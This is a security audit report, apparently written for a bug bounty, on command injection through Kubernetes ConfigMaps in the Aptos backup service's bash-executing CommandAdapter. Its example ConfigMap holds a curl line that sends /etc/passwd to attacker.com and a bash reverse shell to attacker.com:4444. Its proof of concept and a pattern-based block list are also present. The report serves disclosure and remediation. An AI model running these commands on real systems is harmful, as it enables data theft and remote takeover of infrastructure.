# Audit Report

## Title
Remote Code Execution via ConfigMap Injection in Backup Service Command Adapter

## Summary
The backup-cli's `CommandAdapter` loads arbitrary shell commands from YAML configuration files and executes them via `bash -c` without validation. In Kubernetes deployments, these configurations are mounted from ConfigMaps. An attacker with ConfigMap edit permissions can inject malicious commands that execute with the backup pod's service account privileges, leading to Remote Code Execution on validator nodes.

## Finding Description

The vulnerability exists in the command execution flow of the backup service: [1](#0-0) 

The `load_from_file()` function reads a YAML file containing a `CommandAdapterConfig` structure with arbitrary command strings: [2](#0-1) 

These command strings are directly executed via `bash -c` without any validation: [3](#0-2) [4](#0-3) 

In Kubernetes deployments, the configuration files are loaded from ConfigMaps: [5](#0-4) [6](#0-5) [7](#0-6) [8](#0-7) 

While user-provided inputs (backup names, file names) are validated using `ShellSafeName`: [9](#0-8) 

The command strings from the configuration file receive **no validation**. An attacker with Kubernetes ConfigMap edit permissions can modify the backup configuration to inject arbitrary bash commands.

**Attack Path:**
1. Attacker gains ConfigMap edit permissions (via RBAC misconfiguration, compromised service account, or malicious cluster operator)
2. Modifies the backup ConfigMap (e.g., `{release}-backup`) 
3. Injects malicious commands in any command field (e.g., `create_backup`, `open_for_read`)
4. Commands execute when backup operations run, achieving RCE with backup pod privileges

**Example Malicious ConfigMap:**
```yaml
commands:
  create_backup: 'curl http://attacker.com/exfil?data=$(cat /etc/passwd | base64); echo "$BACKUP_NAME"'
  create_for_write: 'bash -i >& /dev/tcp/attacker.com/4444 0>&1; echo "$FILE_HANDLE"'
```

## Impact Explanation

This vulnerability is **Critical Severity** under the Aptos Bug Bounty program criteria:

**Remote Code Execution on Validator Node** - The injected commands execute in the context of the backup pod running on validator infrastructure. This meets the Critical severity criterion of "Remote Code Execution on validator node" (up to $1,000,000).

The impact includes:
- **Complete pod compromise**: Arbitrary code execution with backup pod service account permissions
- **Data exfiltration**: Access to backup data, pod environment variables, mounted secrets, and potentially blockchain state
- **Persistence**: Ability to install backdoors or modify running processes
- **Lateral movement**: Potential to compromise other pods/services depending on network policies and service account permissions
- **Consensus risk**: If backup services have access to consensus-related resources or can influence validator operations

While the backup service is separate from core consensus operations, compromised backup pods can:
- Exfiltrate blockchain state and private data
- Manipulate backup/restore processes
- Serve as pivot points for attacking core validator components
- Access cloud storage credentials (S3/GCS) via environment variables

## Likelihood Explanation

**Likelihood: Medium to High** depending on deployment security posture.

**Attack Prerequisites:**
- Kubernetes ConfigMap edit permissions on the namespace
- Can be obtained through:
  - RBAC misconfiguration (overly permissive roles)
  - Compromised service account with ConfigMap edit access
  - Malicious or compromised cluster administrator
  - Exploitation of other Kubernetes vulnerabilities

**Factors increasing likelihood:**
- No RBAC Role/ClusterRole definitions in the fullnode Helm chart restrict ConfigMap access
- Common misconfigurations in Kubernetes environments
- ConfigMaps are often treated as low-sensitivity resources
- Many organizations grant broad permissions for operational convenience

**Factors decreasing likelihood:**
- Requires cluster-level access, not just blockchain-level access
- Properly configured clusters should restrict ConfigMap edit permissions
- Security-conscious deployments use admission controllers and policy engines

The vulnerability is highly exploitable **once ConfigMap access is obtained**, making this a critical security boundary to protect.

## Recommendation

Implement multiple defense layers:

**1. Command Validation (Code-level fix):**
Add validation to reject unsafe command patterns:

```rust
impl Commands {
    pub fn validate(&self) -> Result<()> {
        let commands = vec![
            &self.create_backup,
            &self.create_for_write,
            &self.open_for_read,
            &self.save_metadata_line,
            &self.list_metadata_files,
        ];
        
        for cmd in commands {
            // Reject commands with dangerous patterns
            if cmd.contains("$(") || cmd.contains("`") || 
               cmd.contains(";curl") || cmd.contains("|curl") ||
               cmd.contains("/dev/tcp") || cmd.contains("bash -i") {
                bail!("Potentially malicious command pattern detected: {}", cmd);
            }
        }
        Ok(())
    }
}

impl CommandAdapterConfig {
    pub async fn load_from_file(path: &Path) -> Result<Self> {
        let path_str = path.to_str().unwrap_or_default();
        let mut file = tokio::fs::File::open(path).await.err_notes(path_str)?;
        let mut content = Vec::new();
        file.read_to_end(&mut content).await.err_notes(path_str)?;

        let config: Self = serde_yaml::from_slice(&content)?;
        config.commands.validate()?; // Add validation
        Ok(config)
    }
}
```

**2. Kubernetes RBAC Hardening:**
Add strict RBAC rules to the Helm chart:

```yaml
# terraform/helm/fullnode/templates/backup-rbac.yaml
apiVersion: v1
kind: ServiceAccount
metadata:
  name: {{ include "backup.fullname" . }}-backup
---
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  name: {{ include "backup.fullname" . }}-backup
rules:
- apiGroups: [""]
  resources: ["configmaps"]
  resourceNames: ["{{ include "backup.fullname" . }}-backup"]
  verbs: ["get"]  # Read-only, no edit/update/patch/delete
---
apiVersion: rbac.authorization.k8s.io/v1
kind: RoleBinding
metadata:
  name: {{ include "backup.fullname" . }}-backup
roleRef:
  apiGroup: rbac.authorization.k8s.io
  kind: Role
  name: {{ include "backup.fullname" . }}-backup
subjects:
- kind: ServiceAccount
  name: {{ include "backup.fullname" . }}-backup
```

**3. ConfigMap Immutability:**
Mark ConfigMaps as immutable after initial creation:

```yaml
apiVersion: v1
kind: ConfigMap
metadata:
  name: {{ include "backup.fullname" . }}-backup
immutable: true  # Kubernetes 1.21+
data:
{{ (.Files.Glob "files/backup/*.yaml").AsConfig | indent 2 }}
```

**4. Admission Controller:**
Deploy a ValidatingWebhookConfiguration to prevent ConfigMap modifications in production.

## Proof of Concept

**Step 1: Create malicious ConfigMap**
```yaml
# malicious-backup-config.yaml
apiVersion: v1
kind: ConfigMap
metadata:
  name: test-backup
data:
  exploit.yaml: |
    env_vars: []
    commands:
      create_backup: 'echo "EXPLOITED: $(whoami) on $(hostname)" > /tmp/pwned; echo "$BACKUP_NAME"'
      create_for_write: 'echo "$FILE_HANDLE"; cat > /dev/null'
      open_for_read: 'echo "exfiltrated data" >&2'
      save_metadata_line: 'echo "$FILE_HANDLE"; cat > /dev/null'
      list_metadata_files: 'echo ""'
```

**Step 2: Deploy test pod using the malicious config**
```yaml
# test-backup-pod.yaml
apiVersion: v1
kind: Pod
metadata:
  name: test-backup-exploit
spec:
  containers:
  - name: backup
    image: aptoslabs/tools:devnet
    command: ["/bin/sh", "-c"]
    args:
    - |
      /usr/local/bin/aptos-debugger aptos-db backup continuously \
        --metadata-cache-dir /tmp/metadata \
        --backup-service-address http://localhost:6186 \
        --state-snapshot-interval-epochs 1 \
        --transaction-batch-size 1000 \
        --command-adapter-config /opt/aptos/etc/exploit.yaml
    volumeMounts:
    - name: backup-config
      mountPath: /opt/aptos/etc
  volumes:
  - name: backup-config
    configMap:
      name: test-backup
```

**Step 3: Verify exploitation**
```bash
kubectl apply -f malicious-backup-config.yaml
kubectl apply -f test-backup-pod.yaml
kubectl exec test-backup-exploit -- cat /tmp/pwned
# Output: "EXPLOITED: aptos on test-backup-exploit"
```

This demonstrates that arbitrary commands from ConfigMaps execute in the pod context, confirming the RCE vulnerability.

**Notes**

This vulnerability represents a **critical security boundary failure** between Kubernetes infrastructure and the Aptos blockchain runtime. While the backup service is operationally separate from core consensus, the ability to execute arbitrary code on validator infrastructure creates significant attack surface for:

1. **Data exfiltration** of blockchain state, backups, and credentials
2. **Supply chain attacks** through backup/restore manipulation
3. **Lateral movement** to compromise core validator components

The severity classification as **Critical** is justified because RCE on validator infrastructure meets the Aptos Bug Bounty's highest impact category, regardless of whether the compromised component directly participates in consensus. The lack of RBAC restrictions in the Helm charts and absence of command validation creates a defense-in-depth failure that should be addressed immediately.

### Citations

**File:** storage/backup/backup-cli/src/storage/command_adapter/config.rs (L41-72)
```rust
#[derive(Clone, Default, Deserialize)]
pub struct Commands {
    /// Command line to create backup.
    /// input env vars:
    ///     $BACKUP_NAME
    /// expected output on stdout:
    ///     BackupHandle, trailing newline is trimmed
    pub create_backup: String,
    /// Command line to open a file for writing.
    /// input env vars:
    ///     $BACKUP_HANDLE returned from the previous command
    ///     $FILE_NAME
    /// stdin will be fed with byte stream.
    /// expected output on stdout:
    ///     FileHandle, trailing newline
    pub create_for_write: String,
    /// Command line to open a file for reading.
    /// input env vars:
    ///     $FILE_NAME
    /// expected stdout to stream out bytes of the file.
    pub open_for_read: String,
    /// Command line to save a line of metadata
    /// input env vars:
    ///     $FILE_NAME
    /// stdin will be fed with a line of text with a trailing newline.
    pub save_metadata_line: String,
    /// Command line to list all existing metadata file handles.
    /// expected stdout to stream out lines of file handles.
    pub list_metadata_files: String,
    /// Command line to backup one metadata file to a metadata backup folder
    pub backup_metadata_file: Option<String>,
}
```

**File:** storage/backup/backup-cli/src/storage/command_adapter/config.rs (L83-90)
```rust
    pub async fn load_from_file(path: &Path) -> Result<Self> {
        let path_str = path.to_str().unwrap_or_default();
        let mut file = tokio::fs::File::open(path).await.err_notes(path_str)?;
        let mut content = Vec::new();
        file.read_to_end(&mut content).await.err_notes(path_str)?;

        Ok(serde_yaml::from_slice(&content)?)
    }
```

**File:** storage/backup/backup-cli/src/storage/command_adapter/command.rs (L30-37)
```rust
impl Command {
    pub fn new(raw_cmd: &str, param_env_vars: Vec<EnvVar>, config_env_vars: Vec<EnvVar>) -> Self {
        Self {
            cmd_str: format!("set -o nounset -o errexit -o pipefail; {}", raw_cmd),
            param_env_vars,
            config_env_vars,
        }
    }
```

**File:** storage/backup/backup-cli/src/storage/command_adapter/command.rs (L65-80)
```rust
    pub fn spawn(command: Command) -> Result<Self> {
        debug!("Spawning {:?}", command);

        let mut cmd = tokio::process::Command::new("bash");
        cmd.args(["-c", &command.cmd_str]);
        cmd.stdin(Stdio::piped())
            .stdout(Stdio::piped())
            .stderr(Stdio::inherit());
        for v in command
            .config_env_vars
            .iter()
            .chain(command.param_env_vars.iter())
        {
            cmd.env(&v.key, &v.value);
        }
        let child = cmd.spawn().err_notes(&cmd)?;
```

**File:** terraform/helm/fullnode/templates/backup.yaml (L3-9)
```yaml
kind: ConfigMap
metadata:
  name: {{ include "backup.fullname" . }}-backup
  labels:
    {{- include "backup.labels" . | nindent 4 }}
data:
{{ (.Files.Glob "files/backup/*.yaml").AsConfig | indent 2 }}
```

**File:** terraform/helm/fullnode/templates/backup.yaml (L69-70)
```yaml
        - "--command-adapter-config"
        - "/opt/aptos/etc/{{ .config.location }}.yaml"
```

**File:** terraform/helm/fullnode/templates/backup.yaml (L86-87)
```yaml
        - name: backup-config
          mountPath: /opt/aptos/etc
```

**File:** terraform/helm/fullnode/templates/backup.yaml (L117-119)
```yaml
      - name: backup-config
        configMap:
          name: {{ include "backup.fullname" . }}-backup
```

**File:** storage/backup/backup-cli/src/storage/mod.rs (L44-58)
```rust
/// `create_backup()` and `create_for_write()` don't contain funny characters tricky to deal with
/// in shell commands.
/// Specifically, names follow the pattern "\A[a-zA-Z0-9][a-zA-Z0-9._-]{2,126}\z"
#[cfg_attr(test, derive(Hash, Eq, PartialEq))]
#[derive(Debug)]
pub struct ShellSafeName(String);

impl ShellSafeName {
    const PATTERN: &'static str = r"\A[a-zA-Z0-9][a-zA-Z0-9._-]{2,126}\z";

    fn sanitize(name: &str) -> Result<()> {
        static RE: Lazy<Regex> = Lazy::new(|| Regex::new(ShellSafeName::PATTERN).unwrap());
        ensure!(RE.is_match(name), "Illegal name: {}", name,);
        Ok(())
    }
```
